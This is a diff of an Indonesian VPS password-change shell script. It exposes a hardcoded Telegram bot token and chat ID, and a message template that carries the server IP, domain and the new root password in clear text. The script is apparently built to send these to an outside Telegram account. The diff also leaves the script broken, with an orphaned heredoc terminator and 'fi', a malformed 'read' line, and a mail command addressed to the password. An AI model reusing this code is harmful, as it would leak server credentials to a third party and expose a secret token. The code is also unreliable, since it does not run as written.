@@ -15,12 +15,8 @@ IP=$(curl -sS ipv4.icanhazip.com)
 domain=$(cat /etc/xray/domain)
 date=$(date +"%Y-%m-%d")
 clear
-pw=$(cat /etc/root/passwd)
-if [[ "$pw" = "" ]]; then
 echo "Masukkan Password Baru"
-read -rp "New Pw : " -e pw
-cat <<EOF>>/root/pw
-$pw
+read -rp "New Pw : "passwd
 EOF
 fi
 clear
@@ -28,12 +24,10 @@ echo "Mohon Menunggu , Proses Ganti Password sedang berlangsung !!"
 Detail Your Vps Info 
 ==================================
 IP VPS        : $IP
-NEW PASS   : $pw
+NEW PASS   : $passwd
 Tanggal       : $date
 ==================================
-" | mail -s "YOUR PASSWORD" $pw
-rm -rf /root/passwd
-rm -r /root/$IP-$date.zip
+" | mail -s "YOUR PASSWORD" $passwd
 clear
 CHATID="5716954563"
 KEY="6379535129:AAGfTsJgiZwaUZRPz_DiF5HOv7qMJMdRHeY"
@@ -47,7 +41,7 @@ TEXT="
 <b>IP VPS  :</b> <code>${IP} </code>
 <b>DOMAIN :</b> <code>${domain}</code>
 <b>Tanggal : $date</b>
-<b>NEW PW :$pw</b>
+<b>NEW PW :$passwd</b>
 <code>◇━━━━━━━━━━━━━━◇</code>
 <code>BY BOT : @WokszXD</code>
 "
